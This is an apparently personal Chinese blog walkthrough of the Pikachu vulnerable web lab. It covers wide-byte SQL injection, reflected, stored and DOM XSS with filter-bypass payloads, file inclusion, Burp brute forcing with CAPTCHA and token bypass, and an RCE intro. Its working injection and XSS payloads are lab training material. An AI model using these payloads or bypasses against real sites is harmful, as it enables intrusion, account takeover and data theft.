&lt;h2 id=&#34;宽字节注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#宽字节注入&#34;&gt;#&lt;/a&gt; 宽字节注入&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/Rain99-/p/10583406.html&#34;&gt;详解&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;字符、字符集&lt;br&gt;
字符 (character) 是组成字符集 (character set) 的基本单位。对字符赋予一个数值 (encoding) 来确定这个字符在该字符集中的位置。&lt;/li&gt;
&lt;li&gt;UTF8&lt;br&gt;
 由于 ASCII 表示的字符只有 128 个，因此网络世界的规范是使用 UNICODE 编码，但是用 ASCII 表示的字符使用 UNICODE 并不高效。因此出现了中间格式字符集，被称为通用转换格式，及 UTF (Universal Transformation Format)。&lt;/li&gt;
&lt;li&gt;宽字节&lt;br&gt;
 GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃 ASCII 字符 (一字节) 的现象，即将两个 ascii 字符误认为是一个宽字节字符。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;宽字节注入原理：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;GBK 占用两字节&lt;/p&gt;
&lt;p&gt;ASCII 占用一字节&lt;/p&gt;
&lt;p&gt;PHP 中编码为 GBK，函数执行添加的是 ASCII 编码（添加的符号为 “\”），MYSQL 默认字符集是 GBK 等宽字节字符集。&lt;/p&gt;
&lt;p&gt;大家都知道 % df’ 被 PHP 转义（开启 GPC、用 addslashes 函数，或者 icov 等），单引号被加上反斜杠 \，变成了 % df\’，其中 \ 的十六进制是 %5C ，那么现在  &lt;code&gt;%df\’&lt;/code&gt;  = &lt;code&gt;%df%5c%27&lt;/code&gt; ，如果程序的默认字符集是 GBK 等宽字节字符集，则 MySQL 用 GBK 的编码时，会认为  &lt;code&gt;%df%5c&lt;/code&gt;  是一个宽字符，也就是 &lt;code&gt;縗&lt;/code&gt; ，也就是说：% df\’ = % df%5c%27 = 縗’，有了单引号就好注入了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://img2018.cnblogs.com/blog/1335588/201903/1335588-20190323124156168-514841357.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;name=%df&amp;#x27; or 1=1 %23+&amp;amp;submit=%E6%9F%A5%E8%AF%A2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;所有数据输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;your uid:1your email is: eyour uid:2your email is: allen@pikachu.comyour uid:3your email is: kobe@pikachu.comyour uid:4your email is: grady@pikachu.comyour uid:5your email is: kevin@pikachu.comyour uid:6your email is: lucy@pikachu.com......&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;h1 id=&#34;xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss&#34;&gt;#&lt;/a&gt; XSS&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;XSS 漏洞可以用来进行钓鱼攻击，前端 JS 挖矿，用户 cookie 获取。甚至可以结合浏览器自身的漏洞对用户主机进行远程控制。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;反射型xssget&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反射型xssget&#34;&gt;#&lt;/a&gt; 反射型 xss (get)&lt;/h2&gt;
&lt;h3 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;​	文本框下方会回显输入的内容，想输万能弹窗 &lt;code&gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&lt;/code&gt; ，发现文本框限制了字数，前端直接定位改成 100，成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-xss-001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为为 get 请求，所以输入的参数值会出现在 url 末尾&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;反射型xsspost大失败&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反射型xsspost大失败&#34;&gt;#&lt;/a&gt; 反射型 xss (post)（大失败）&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-xss-002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	POST 请求区别与 GET 请求，POST 请求不能从 URL 让用户向服务器提交数据。所以为了进行注入，需要让用户代替攻击者提交 POST 请求，这就需要攻击者自己搭建站点，然后再站点内写一个 POST 表单，将我们搭建出的连接发给用户，这样就能让用户帮攻击者提交 POST 请求发给存在 XSS 漏洞的中。这样就能窃取到用户的 cookie，就能伪造用户登陆达到破坏的目的。&lt;/p&gt;
&lt;h3 id=&#34;过程-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-2&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;但是这后台我没登进去呀～&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;存储型xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#存储型xss&#34;&gt;#&lt;/a&gt; 存储型 xss&lt;/h2&gt;
&lt;h3 id=&#34;过程-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-3&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;​	直接搞个超链接，留言列表点击跳转&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-xss-003.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;script&gt;alert(1)&lt;/script&gt; 的话，每次刷新页面都会弹窗
&lt;hr&gt;
&lt;h2 id=&#34;dom型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dom型&#34;&gt;#&lt;/a&gt; dom 型&lt;/h2&gt;
&lt;p&gt;click 一下，发现超链接的跳转是输入的字符串，所以直接闭合就可&lt;/p&gt;
&lt;h3 id=&#34;过程-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-4&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-xss-004.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试用双引号闭合的时候，尽然没有作用？？？&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;payload&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a&amp;quot;&amp;gt;nhhh&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;alert(1)&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;#&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-xss-005.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;全部改成单引号 &lt;code&gt;a&#39;&amp;gt;nhhh&amp;lt;/a&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;a href=&#39;#&lt;/code&gt; ：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-xss-006.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是 js 脚本没有生效，因为没有返回给服务器，所以刷新之后更改的也没有了，可以通过 onclick 弹窗:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;a&#39; onclick=&amp;quot;alert(1)&amp;quot;&amp;gt;nhhh&amp;lt;/a&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;a href=&#39;#&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-xss-007.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;dom型xss-x&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dom型xss-x&#34;&gt;#&lt;/a&gt; dom 型 xss-x&lt;/h2&gt;
&lt;h3 id=&#34;过程-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-5&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;随便输入 a 后点按钮，出现一个超链接，发现这个超链接有一个事件，调用了 domxss () 函数，Ctrl+F 找一下 domxss 看 js 源代码，竟然还有这种明示&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-xss-008.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接输入：’ onclick=“alert (‘xss’)”&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-xss-009.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;xss之盲打&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss之盲打&#34;&gt;#&lt;/a&gt; xss 之盲打&lt;/h2&gt;
&lt;h3 id=&#34;过程-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-6&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;根据提示登录后台，发现有我们提交的数据（这里只能显示一个我们交的数据！气人），所以前台提交&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;payload&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;alert(1)&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后台就会被弹&lt;/p&gt;
&lt;p&gt;可以利用这个获取 cookie，但是我还是没有试&lt;/p&gt;
&lt;p&gt;(爱鸭，怎么能不试试呢～)&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;xss之过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss之过滤&#34;&gt;#&lt;/a&gt; xss 之过滤&lt;/h2&gt;
&lt;h3 id=&#34;过程-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-7&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;经过多次尝试，应是过滤了 &amp;lt; script 和前面所有字符，大小写可以绕过，也可以用&lt;a onclick=&#34;alert(1)&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;xss之htmlspecialcahrs我总是以为自己没绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss之htmlspecialcahrs我总是以为自己没绕过&#34;&gt;#&lt;/a&gt; xss 之 htmlspecialcahrs，我总是以为自己没绕过&lt;/h2&gt;
&lt;h3 id=&#34;过程-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-8&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;默认不过滤单引号&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;payload&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#&amp;#x27; onclick=&amp;#x27;alert(111)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;h2 id=&#34;xss之href输出&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss之href输出&#34;&gt;#&lt;/a&gt; xss 之 href 输出&lt;/h2&gt;
&lt;h3 id=&#34;过程-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-9&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;payload&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;javascript:alert(1)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-xss-011.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;xss之js输出&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss之js输出&#34;&gt;#&lt;/a&gt; xss 之 js 输出&lt;/h2&gt;
&lt;h3 id=&#34;过程-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-10&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;看表单发现 js 有个判断，输入 tmac 会输出一张图片，直接插入 onclick=“alert (1)”&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-xss-012.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-xss-010.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;据说可以闭合，成功弹窗&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;payload&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;alert(1)&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;闭合后的 js：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-xss-013.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_43899561/article/details/89429726&#34;&gt;大佬写的关于 xss 抓 cookie&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.fujieace.com/penetration-test/xss-100.html&#34;&gt;XSS 过滤绕过方法&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/heiwa-0924/p/12520547.html&#34;&gt;通关手册，写得挺好&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;文件包含&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件包含&#34;&gt;#&lt;/a&gt; 文件包含&lt;/h1&gt;
&lt;p&gt;文件包含之看不懂自己在写什么，所以无法上传系列&lt;/p&gt;
&lt;p&gt;看样子应该就是基础的文件包含鸭～&lt;/p&gt;
&lt;h2 id=&#34;总结-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-2&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;文件包含：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;文件包含在 php 中，涉及到的危险函数有四个，分别是 include ()、include_once ()、require ()、require_once ()。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;区别如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;include：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。&lt;/p&gt;
&lt;p&gt;include_once：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。&lt;/p&gt;
&lt;p&gt;require：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。&lt;/p&gt;
&lt;p&gt;require_once：和 require 类似，不同处在于 require_once 只导入一次。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1 id=&#34;暴力破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#暴力破解&#34;&gt;#&lt;/a&gt; 暴力破解&lt;/h1&gt;
&lt;h2 id=&#34;基于表单的爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#基于表单的爆破&#34;&gt;#&lt;/a&gt; 基于表单的爆破&lt;/h2&gt;
&lt;h3 id=&#34;过程-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-11&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;​	bp 抓包，intrude 直接爆密码，用户名 admin。&lt;/p&gt;
&lt;p&gt;​	根据提示，发现有三个账号：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;admin&lt;/li&gt;
&lt;li&gt;pikachu&lt;/li&gt;
&lt;li&gt;test&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;前两个应该直接猜到的，最后一个还没见过，不过涨姿势了，应该都是常用账户名。&lt;/p&gt;
&lt;p&gt;想了想，用 bp 同时爆破用户名和密码（就是速度太慢了）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-baopo-003.png&#34; alt=&#34;pikachu-baopo-003&#34;&gt;&lt;/p&gt;
&lt;p&gt;pitchfork 也可以啊&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-baopo-001.png&#34; alt=&#34;pikachu-baopo-001&#34;&gt;&lt;/p&gt;
&lt;p&gt;这是给第二个参数设置字典，你这个猪&lt;img src=&#34;pikachu-baopo-002.png&#34; alt=&#34;pikachu-baopo-002&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;验证码绕过on-server&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证码绕过on-server&#34;&gt;#&lt;/a&gt; 验证码绕过（on server）&lt;/h2&gt;
&lt;h3 id=&#34;过程-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-12&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;看抓的包，发现把用户输入的验证码和用户名密码一起发到服务器了，而且在 cookie 里发现了验证码的值，所以判断是验证码绕过。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-baopo-004.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;基本过程：客户端发起请求 -&amp;gt; 服务端响应并创建一个新的 SessionID 同时生成随机验证码，将验证码和 SessionID 一并返回给客户端 -&amp;gt; 客户端提交验证码连同 SessionID 给服务端 -&amp;gt; 服务端验证验证码同时销毁当前会话，返回给客户端结果。&lt;/p&gt;
&lt;p&gt;所以用 bp 拦截，不让页面刷新，就不会销毁会话，也不会更新验证码，就可以用 bp 爆破辣，在 cookie 中带固定的 sessionID 和固定的验证码字符串&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-baopo-005.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;验证码绕过on-client&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证码绕过on-client&#34;&gt;#&lt;/a&gt; 验证码绕过（on client）&lt;/h2&gt;
&lt;h3 id=&#34;过程-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-13&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;在前台找到了验证验证码的函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-baopo-006.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过搜索函数名，定位执行函数的位置，把这个事件删掉，bp 抓包，发现有 vcode 参数，删掉删掉，直接爆破&lt;/p&gt;
&lt;p&gt;写完 token 发现也可自动化获取前端信息，进行爆破&lt;/p&gt;
&lt;h2 id=&#34;token防爆&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#token防爆&#34;&gt;#&lt;/a&gt; token 防爆&lt;/h2&gt;
&lt;h3 id=&#34;过程-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-14&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;token 主要用来防御 csrf，而无法防止暴力破解。&lt;/p&gt;
&lt;p&gt;这是因为将一个随机产生的 token 加入请求之后，每次请求 token 都会改变。&lt;/p&gt;
&lt;p&gt;csrf 攻击者只能窃取受害者的 cookie 却不能伪造当次请求的 token，token 无法防止暴力破解的原因是 token 每次都会随页面返回到前端，攻击者只要想办法__自动化获得前端的 token__即可进行暴力破解攻击。&lt;/p&gt;
&lt;p&gt;option 中的 Grep -Extract: 这个设置能够被用来通过请求返回的信息来获取有用的信息供你使用。也就是说，可以通过它来获得每次请求后返回的 token，关联到 payload 中进行暴力破解。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-baopo-007.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这样就设置完毕了，需要注意的是 burp 的 Pichfork 爆破模式只能进行单线程的爆破，设置一下线程 1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-baopo-008.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-baopo-009.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-baopo-010.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后常规爆破就好了&lt;/p&gt;
&lt;h2 id=&#34;总结-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-3&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;BurpSuite intruder attack-type 4 种爆破模式：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Sniper 单参数爆破，多参数时同一个字典按顺序替换各参数，总之初始值有一个参数不变&lt;/p&gt;
&lt;p&gt;Battering ram 多参数同时爆破，但用的是同一个字典&lt;/p&gt;
&lt;p&gt;Pichfork 多参数同时爆破，但用的是不同的字典&lt;/p&gt;
&lt;p&gt;Cluster bamb 多参数做笛卡尔乘积模式爆破&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/kllay/p/7136022.html&#34;&gt;bp 爆破各种类型解说&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/rnss/p/11233006.html&#34;&gt;token 看的这位大佬&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; RCE&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;漏洞概述&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RCE（remote command/code execute）漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。&lt;/p&gt;
&lt;p&gt;(搬一下皮卡丘哒，对这个不是很熟悉)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;远程系统命令执行&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口&lt;br&gt;
比如我们常见的路由器、防火墙、入侵检测等设备的 web 管理界面上&lt;/p&gt;
&lt;p&gt;一般会给用户提供一个 ping 操作的 web 界面，用户从 web 界面输入目标 IP，提交后，后台会对该 IP 地址进行一次 ping 测试，并返回测试结果。而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交 “意想不到” 的命令，从而让后台进行执行，从而控制整个后台服务器&lt;/p&gt;
&lt;p&gt;现在很多的甲方企业都开始实施自动化运维，大量的系统操作会通过 &amp;quot;自动化运维平台&amp;quot; 进行操作。在这种平台上往往会出现远程系统命令执行的漏洞，不信的话现在就可以找你们运维部的系统测试一下，会有意想不到的 &amp;quot;收获&amp;quot;-_-&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;远程代码执行&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;同样的道理，因为需求设计，后台有时候也会把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞。不管是使用了代码执行的函数，还是使用了不安全的反序列化等等。&lt;/p&gt;
&lt;p&gt;因此，如果需要给前端用户提供操作类的 API 接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。&lt;/p&gt;
&lt;p&gt;你可以通过 “RCE” 对应的测试栏目，来进一步的了解该漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;exec-ping&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exec-ping&#34;&gt;#&lt;/a&gt; exec “ping”&lt;/h2&gt;
&lt;h3 id=&#34;过程-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-15&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;post 方法，用火狐拦截重发，payload：&lt;/p&gt;
